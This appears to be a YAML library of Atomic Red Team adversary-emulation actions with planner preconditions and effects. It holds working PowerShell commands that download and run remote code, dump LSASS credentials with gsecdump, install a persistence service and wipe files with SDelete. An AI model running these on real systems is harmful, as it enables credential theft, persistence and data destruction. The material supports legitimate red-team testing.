  - uuid: art-t1003-gsecdump-lsass
    name: Gsecdump
    id:
      - T1003
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - OS Credential Dumping
    description: |
      Dumps active-session credentials from LSASS via gsecdump-v2b5 (TrueSec
      legacy tool). Uses Method 3 (fold get_prereq_command from ART): the
      action itself stages the binary from web.archive.org with SHA256
      verification if not already present, then runs `gsecdump -a`. Precondition
      is just a powershell session; no marker predicate for the binary. ART
      auto_generated_guid 96345bfc-8ae7-4b6a-80b7-223200f24ef9.
    execution:
      executor: Powershell Executor
      command: |
        if (-not (Test-Path "#{gsecdump_exe}")) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $parentpath = Split-Path "#{gsecdump_exe}"
          $binpath = "$parentpath\gsecdump-v2b5.exe"
          New-Item -ItemType Directory $parentpath -Force | Out-Null
          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
          if (Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" "#{gsecdump_bin_hash}") {
            Move-Item $binpath "#{gsecdump_exe}"
          }
        }
        & "#{gsecdump_exe}" -a
    arguments:
      executor:
        description: The Powershell session ID used to invoke the prereq + main command.
        required: true
        pddl_index: executor1_var_in_plan
      gsecdump_exe:
        default: C:\Users\Public\gsecdump.exe
        description: Local path on target where gsecdump binary should be staged and
          run.
        required: true
      gsecdump_url:
        default: 
          https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
        description: Download URL for the gsecdump-v2b5 binary (web archive).
        required: true
      gsecdump_bin_hash:
        default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
        description: Expected SHA256 of the gsecdump-v2b5.exe binary.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1543_003-new-service-ps
    name: Service Installation PowerShell
    id:
      - T1543.003
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Create or Modify System Process: Windows Service'
    description: |
      PowerShell equivalent of `sc create` — uses the native `New-Service`
      cmdlet to create and start a Windows service persistence pathway.
      ART auto_generated_guid 491a4af6-a521-4b74-b23b-f7b3f1ee9e77.
    execution:
      executor: Powershell Executor
      command: |
        New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
        Start-Service -Name "#{service_name}"
    arguments:
      executor:
        description: The Powershell session ID used to create the service.
        required: true
        pddl_index: executor1_var_in_plan
      service_name:
        default: AtomicTestServicePs
        description: Windows service name to create.
        required: true
      binary_path:
        default: C:\Users\Public\service.exe
        description: Full path to the service binary.
        required: true
        pddl_index: string4_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: art-t1485-sdelete-overwrite
    name: Windows - Overwrite file with SysInternals SDelete
    id:
      - T1485
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - Data Destruction
    description: |
      Sysinternals SDelete overwrites a file with a random pattern before
      deleting it, preventing forensic recovery. Method 3 folds the ART
      prereq (download SDelete.zip from Sysinternals, expand, copy sdelete.exe).
      ART auto_generated_guid 476419b5-aebf-4366-a131-ae3e8dae5fc2.
    execution:
      executor: Powershell Executor
      command: |
        $sdelete = "#{sdelete_exe}"
        if (-not (Test-Path $sdelete)) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $zipPath = "$env:TEMP\SDelete.zip"
          $extractDir = "$env:TEMP\Sdelete"
          Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile $zipPath
          Expand-Archive $zipPath $extractDir -Force
          New-Item -ItemType Directory (Split-Path $sdelete) -Force | Out-Null
          Copy-Item "$extractDir\sdelete.exe" $sdelete -Force
        }
        if (-not (Test-Path "#{file_to_delete}")) { New-Item "#{file_to_delete}" -Force | Out-Null }
        & $sdelete -accepteula "#{file_to_delete}"
    arguments:
      executor:
        description: The Powershell session ID used to invoke SDelete.
        required: true
        pddl_index: executor1_var_in_plan
      sdelete_exe:
        default: C:\Users\Public\sdelete.exe
        description: Target-side path where sdelete.exe is staged.
        required: true
      file_to_delete:
        default: C:\Users\Public\wipe-me.txt
        description: Target-side path to the file that SDelete will overwrite and
          delete.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
    effects:
      - (file-deleted ?f - file ?target - host)
